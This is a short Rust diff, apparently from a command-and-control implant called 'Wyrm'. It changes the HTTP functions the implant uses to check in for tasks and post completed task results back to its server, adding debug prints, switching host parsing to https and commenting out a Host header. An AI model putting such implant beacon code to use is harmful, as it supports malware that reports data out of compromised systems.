@@ -76,6 +76,7 @@ pub fn comms_http_check_in(implant: &mut Wyrm) -> Result<Vec<Task>, minreq::Erro
 }
 
 fn http_get(url: String, headers: HashMap<String, String>) -> Result<Response, minreq::Error> {
+    println!("Sending get to: {url}");
     minreq::get(url).with_headers(headers).send()
 }
 
@@ -101,10 +102,16 @@ fn http_post(
     let serialised_post_body: Vec<u8> =
         serde_json::to_vec(&completed_tasks).expect("could not ser");
 
-    let host = url.trim_start_matches("http://").split('/').next().unwrap();
+    let host = url
+        .trim_start_matches("https://")
+        .split('/')
+        .next()
+        .unwrap();
+
+    println!("Sending post to: {url}");
 
     minreq::post(&url)
-        .with_header("Host", host)
+        // .with_header("Host", host)
         .with_header("Content-Type", "application/json")
         .with_headers(headers)
         .with_body(serialised_post_body)
